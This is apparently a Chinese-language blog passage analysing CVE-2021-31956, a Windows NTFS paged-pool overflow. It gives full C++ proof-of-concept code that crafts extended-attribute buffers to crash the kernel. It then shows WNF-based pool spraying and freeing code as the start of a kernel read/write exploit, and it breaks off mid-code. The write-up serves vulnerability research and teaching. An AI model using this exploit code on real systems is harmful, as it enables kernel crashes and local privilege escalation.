<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_STATUS_BLOCK</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        LONG Status;</span><br><span class="line">        PVOID Pointer;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG Information;</span><br><span class="line">&#125; IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_FILE_FULL_EA_INFORMATION</span> &#123;</span><br><span class="line">    ULONG  NextEntryOffset;</span><br><span class="line">    UCHAR  Flags;</span><br><span class="line">    UCHAR  EaNameLength;</span><br><span class="line">    USHORT EaValueLength;</span><br><span class="line">    CHAR   EaName[<span class="number">1</span>];</span><br><span class="line">&#125; FILE_FULL_EA_INFORMATION, * PFILE_FULL_EA_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_FILE_GET_EA_INFORMATION</span> &#123;</span><br><span class="line">    ULONG NextEntryOffset;</span><br><span class="line">    UCHAR EaNameLength;</span><br><span class="line">    CHAR  EaName[<span class="number">1</span>];</span><br><span class="line">&#125; FILE_GET_EA_INFORMATION, * PFILE_GET_EA_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwSetEaFile)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    IN HANDLE FileHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PIO_STATUS_BLOCK IoStatusBlock,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG Length</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwQueryEaFile)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    IN HANDLE FileHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PIO_STATUS_BLOCK IoStatusBlock,</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN BOOLEAN ReturnSingleEntry,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN PVOID EaList,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG EaListLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN PULONG EaIndex,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN BOOLEAN RestartScan</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    PZwSetEaFile ZwSetEaFile = (PZwSetEaFile)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtSetEaFile&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwSetEaFile) &#123;</span><br><span class="line"></span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to get ZwSetEaFile : &quot;</span> &lt;&lt; err;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">		PZwQueryEaFile ZwQueryEaFile = (PZwQueryEaFile)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtQueryEaFile&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwQueryEaFile ) &#123;</span><br><span class="line"></span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to get ZwQueryEaFile : &quot;</span> &lt;&lt; err;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> <span class="type">wchar_t</span> *filepath = <span class="string">L&quot;C:\\Users\\Ver\\Desktop\\CVE-2021-31956\\test.txt&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    HANDLE fileHandle = <span class="built_in">CreateFile</span>(filepath,</span><br><span class="line">        GENERIC_READ | GENERIC_WRITE | DELETE,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        OPEN_ALWAYS,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fileHandle == INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to open: &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> setEaBuffer[<span class="number">0xff27</span>] = &#123;</span><br><span class="line">        <span class="number">0x14</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// NextEntryOffset</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="comment">// Flags</span></span><br><span class="line">        <span class="number">0x05</span>, <span class="comment">// EaNameLength</span></span><br><span class="line">        <span class="number">0x04</span>,<span class="number">0x00</span>, <span class="comment">// EaValueLen</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x00</span>, <span class="comment">// name</span></span><br><span class="line">        <span class="number">0x67</span>,<span class="number">0x67</span>,<span class="number">0x67</span>,<span class="number">0x67</span>,<span class="number">0x00</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="comment">// padding</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// NextEntryOffset</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="comment">// Flags</span></span><br><span class="line">        <span class="number">0x04</span>, <span class="comment">// EaNameLength</span></span><br><span class="line">        <span class="number">0x05</span>,<span class="number">0xff</span>, <span class="comment">// EaValueLen</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x00</span>, <span class="comment">// name</span></span><br><span class="line">        <span class="number">0x67</span>,<span class="number">0x67</span>,<span class="number">0x67</span>,<span class="number">0x67</span>,<span class="number">0x67</span>,<span class="number">0x00</span>, <span class="comment">// data</span></span><br><span class="line">    &#125;;</span><br><span class="line">    IO_STATUS_BLOCK setEaIoStatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="built_in">ZwSetEaFile</span>(fileHandle, (PIO_STATUS_BLOCK)&amp;setEaIoStatusBlock, &amp;setEaBuffer, <span class="built_in">sizeof</span>(setEaBuffer));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status != (NTSTATUS)<span class="number">0</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to ZwSetEaFile: &quot;</span> &lt;&lt; std::hex &lt;&lt; status;</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> eaListBuffer[] = &#123;</span><br><span class="line">        <span class="number">0x0c</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// NextEntryOffset</span></span><br><span class="line">        <span class="number">0x05</span>, <span class="comment">// EaNameLength</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x00</span>, <span class="comment">// name</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="comment">// padding</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// NextEntryOffset</span></span><br><span class="line">        <span class="number">0x04</span>, <span class="comment">// EaNameLength</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x00</span>, <span class="comment">// name</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    IO_STATUS_BLOCK queryEaIoStatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    FILE_FULL_EA_INFORMATION queryEaBuffer = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    WORD queryEaBufferLength = <span class="number">18</span>;</span><br><span class="line">    status = <span class="built_in">ZwQueryEaFile</span>(fileHandle, (PIO_STATUS_BLOCK)&amp;queryEaIoStatusBlock, &amp;queryEaBuffer, queryEaBufferLength, <span class="number">0</span>, &amp;eaListBuffer, <span class="built_in">sizeof</span>(eaListBuffer), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (status != (NTSTATUS)<span class="number">0</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to ZwQueryEaFile: &quot;</span> &lt;&lt; std::hex &lt;&lt; status;</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里需要注意漏洞触发的函数是 NtfsQueryEaUserEaList ，所以在 ZwQueryEaFile 的时候要提供对应的 EaList 和 EaListLength ，如果只是正常的查询则走不到漏洞函数。同时我们设置的 NextEntryOffset 也是 32 比特对齐的，所以需要补足 padding 数据。</p>
</blockquote>
<p>最终 <code>BSOD</code> 画面如下</p>
<p><img src="https://s2.loli.net/2022/05/04/3RO9ZNFhGmoKwjY.png" alt="Untitled.png"></p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="从WNF到一定范围内的任意读写"><a href="#从WNF到一定范围内的任意读写" class="headerlink" title="从WNF到一定范围内的任意读写"></a>从WNF到一定范围内的任意读写</h2><p>在我们这个场景中，溢出的是分页池，针对分页池还没有一个比较通用的方法，故此有人逆向并使用了 <code>WNF</code>。<code>WNF（Windows Notification Facitily）</code>是 <code>Windows</code> 中的一个通知系统，它实现了发布者&#x2F;订阅者模型来传递通知。其结构如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">nt!_WNF_NAME_INSTANCE</span><br><span class="line">   +<span class="number">0x000</span> Header           : _WNF_NODE_HEADER</span><br><span class="line">   +<span class="number">0x008</span> RunRef           : _EX_RUNDOWN_REF</span><br><span class="line">   +<span class="number">0x010</span> TreeLinks        : _RTL_BALANCED_NODE</span><br><span class="line">   +<span class="number">0x028</span> StateName        : _WNF_STATE_NAME_STRUCT</span><br><span class="line">   +<span class="number">0x030</span> ScopeInstance    : Ptr64 _WNF_SCOPE_INSTANCE</span><br><span class="line">   +<span class="number">0x038</span> StateNameInfo    : _WNF_STATE_NAME_REGISTRATION</span><br><span class="line">   +<span class="number">0x050</span> StateDataLock    : _WNF_LOCK</span><br><span class="line">   +<span class="number">0x058</span> StateData        : Ptr64 _WNF_STATE_DATA</span><br><span class="line">   +<span class="number">0x060</span> CurrentChangeStamp : Uint4B</span><br><span class="line">   +<span class="number">0x068</span> PermanentDataStore : Ptr64 Void</span><br><span class="line">   +<span class="number">0x070</span> StateSubscriptionListLock : _WNF_LOCK</span><br><span class="line">   +<span class="number">0x078</span> StateSubscriptionListHead : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x088</span> TemporaryNameListEntry : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x098</span> CreatorProcess   : Ptr64 _EPROCESS</span><br><span class="line">   +<span class="number">0x0a0</span> DataSubscribersCount : Int4B</span><br><span class="line">   +<span class="number">0x0a4</span> CurrentDeliveryCount : Int4B</span><br></pre></td></tr></table></figure>

<p>其中 <code>StateData</code> 的 <code>_WNF_STATE_DATA</code> 结构如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nt!_WNF_STATE_DATA</span><br><span class="line">   +<span class="number">0x000</span> Header           : _WNF_NODE_HEADER</span><br><span class="line">   +<span class="number">0x004</span> AllocatedSize    : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> DataSize         : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> ChangeStamp      : Uint4B</span><br></pre></td></tr></table></figure>

<p>数据会紧跟着该结构，存储在该结构的后面。</p>
<p>我们可以使用 <code>NtUpdateWnfStateData</code> 方法来分配任意大小的堆块并存放任意数据，使用方法如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function">NTAPI</span></span><br><span class="line"><span class="function"><span class="title">NtUpdateWnfStateData</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">		_In_ PCWNF_STATE_NAME StateName,</span></span></span><br><span class="line"><span class="params"><span class="function">		_In_reads_bytes_opt_(Length) <span class="type">const</span> VOID* Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">		_In_opt_ ULONG Length, <span class="comment">// Must be less than MaximumSizewhen registered </span></span></span></span><br><span class="line"><span class="params"><span class="function">		_In_opt_ PCWNF_TYPE_ID TypeId, <span class="comment">// Optionally, for type-safety</span></span></span></span><br><span class="line"><span class="params"><span class="function">		_In_opt_ <span class="type">const</span> PVOID ExplicitScope,<span class="comment">// Process handle, User SID, Session ID</span></span></span></span><br><span class="line"><span class="params"><span class="function">		_In_ WNF_CHANGE_STAMP MatchingChangeStamp,<span class="comment">// Expected current change stamp</span></span></span></span><br><span class="line"><span class="params"><span class="function">		_In_ LOGICAL CheckStamp<span class="comment">// Enforce the above or silently ignore it</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>其过程中使用了 <code>ExpWnfWriteStateData</code> 函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v19 = <span class="built_in">ExAllocatePoolWithQuotaTag</span>((POOL_TYPE)<span class="number">9</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(v6 + <span class="number">16</span>), <span class="number">0x20666E57</span>u);</span><br></pre></td></tr></table></figure>

<p>传入的 <code>v6</code> 就是 <code>Length</code> ，分配池的时候额外加上了 <code>0x10</code> 大小的头。</p>
<p>那么分配的时候，首先是 <code>_POOL_HEADER</code> ，如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt _POOL_HEADER</span><br><span class="line">nt!_POOL_HEADER</span><br><span class="line">   +<span class="number">0x000</span> PreviousSize     : Pos <span class="number">0</span>, <span class="number">8</span> Bits</span><br><span class="line">   +<span class="number">0x000</span> PoolIndex        : Pos <span class="number">8</span>, <span class="number">8</span> Bits</span><br><span class="line">   +<span class="number">0x002</span> BlockSize        : Pos <span class="number">0</span>, <span class="number">8</span> Bits</span><br><span class="line">   +<span class="number">0x002</span> PoolType         : Pos <span class="number">8</span>, <span class="number">8</span> Bits</span><br><span class="line">   +<span class="number">0x000</span> Ulong1           : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> PoolTag          : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> ProcessBilled    : Ptr64 _EPROCESS</span><br><span class="line">   +<span class="number">0x008</span> AllocatorBackTraceIndex : Uint2B</span><br><span class="line">   +<span class="number">0x00a</span> PoolTagHash      : Uint2B</span><br></pre></td></tr></table></figure>

<p>随后是 <code>0x10</code> 大小的 <code>_WNF_STATE_DATA</code> ：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nt!_WNF_STATE_DATA</span><br><span class="line">   +<span class="number">0x000</span> Header           : _WNF_NODE_HEADER</span><br><span class="line">   +<span class="number">0x004</span> AllocatedSize    : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> DataSize         : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> ChangeStamp      : Uint4B</span><br></pre></td></tr></table></figure>

<p>最后便是数据的内容。</p>
<p>那么当我们使用如下代码的时候：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">NtCreateWnfStateName</span>(&amp;state, WnfTemporaryStateName, WnfDataScopeMachine, FALSE, <span class="number">0</span>, <span class="number">0x1000</span>, psd);</span><br><span class="line"><span class="built_in">NtUpdateWnfStateData</span>(&amp;state, buf, alloc_size, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function">NTAPI</span></span><br><span class="line"><span class="function"><span class="title">NtCreateWnfStateName</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">		_Out_ PWNF_STATE_NAME StateName,</span></span></span><br><span class="line"><span class="params"><span class="function">		_In_ WNF_STATE_NAME_LIFETIME NameLifetime,</span></span></span><br><span class="line"><span class="params"><span class="function">		_In_ WNF_DATA_SCOPE DataScope,</span></span></span><br><span class="line"><span class="params"><span class="function">		_In_ BOOLEAN PersistData,</span></span></span><br><span class="line"><span class="params"><span class="function">		_In_opt_ PCWNF_TYPE_ID TypeId, <span class="comment">// This is an optional way to get type-safety</span></span></span></span><br><span class="line"><span class="params"><span class="function">		_In_ ULONG MaximumStateSize,<span class="comment">// Cannot be above 4KB</span></span></span></span><br><span class="line"><span class="params"><span class="function">		_In_ PSECURITY_DESCRIPTOR SecurityDescriptor<span class="comment">// *MUST* be present</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>我们便可以分配任意大小的堆块。</p>
<p>那么释放堆块的时候，我们只需要使用 <code>NtDeleteWnfStateData</code> ，其内部调用了 <code>ExpWnfDeleteStateData</code> 来进行释放。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function">NTAPI</span></span><br><span class="line"><span class="function"><span class="title">NtDeleteWnfStateData</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ PCWNF_STATE_NAME StateName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ <span class="type">const</span> VOID *ExplicitScope</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>我们来尝试一下，编写如下代码，其中 <code>allocSize</code> 固定为 <code>0x100</code> ：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WNF_STATE_NAME</span> &#123;</span><br><span class="line">    ULONG Data[<span class="number">2</span>];</span><br><span class="line">&#125; WNF_STATE_NAME, * PWNF_STATE_NAME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> WNF_STATE_NAME* PCWNF_STATE_NAME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_WNF_STATE_NAME_LIFETIME</span> &#123;</span><br><span class="line">    WnfWellKnownStateName,</span><br><span class="line">    WnfPermanentStateName,</span><br><span class="line">    WnfPersistentStateName,</span><br><span class="line">    WnfTemporaryStateName</span><br><span class="line">&#125; WNF_STATE_NAME_LIFETIME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_WNF_STATE_NAME_INFORMATION</span> &#123;</span><br><span class="line">    WnfInfoStateNameExist,</span><br><span class="line">    WnfInfoSubscribersPresent,</span><br><span class="line">    WnfInfoIsQuiescent</span><br><span class="line">&#125; WNF_STATE_NAME_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_WNF_DATA_SCOPE</span> &#123;</span><br><span class="line">    WnfDataScopeSystem,</span><br><span class="line">    WnfDataScopeSession,</span><br><span class="line">    WnfDataScopeUser,</span><br><span class="line">    WnfDataScopeProcess</span><br><span class="line">&#125; WNF_DATA_SCOPE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WNF_TYPE_ID</span> &#123;</span><br><span class="line">    GUID TypeId;</span><br><span class="line">&#125; WNF_TYPE_ID, * PWNF_TYPE_ID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> WNF_TYPE_ID* PCWNF_TYPE_ID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> ULONG WNF_CHANGE_STAMP, * PWNF_CHANGE_STAMP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> ULONG LOGICAL;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwCreateWnfStateName)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ PWNF_STATE_NAME StateName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ WNF_STATE_NAME_LIFETIME NameLifetime,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ WNF_DATA_SCOPE DataScope,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ BOOLEAN PersistData,</span></span></span><br><span class="line"><span 